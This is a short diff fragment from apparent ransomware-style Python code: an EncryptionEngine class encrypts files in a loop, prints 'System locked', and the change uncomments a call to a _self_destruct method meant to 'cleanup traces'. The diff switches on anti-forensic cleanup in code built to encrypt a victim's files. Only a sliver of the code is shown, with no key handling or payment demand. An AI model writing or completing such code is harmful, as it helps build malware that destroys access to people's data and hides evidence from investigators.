@@ -100,7 +100,7 @@ class EncryptionEngine:
                 self._encrypt_file(file_path)
 
         print("\n[🕱] All files processed. System locked.")
-        # self._self_destruct()
+        self._self_destruct()
 
     def _self_destruct(self):
         """Cleanup traces."""
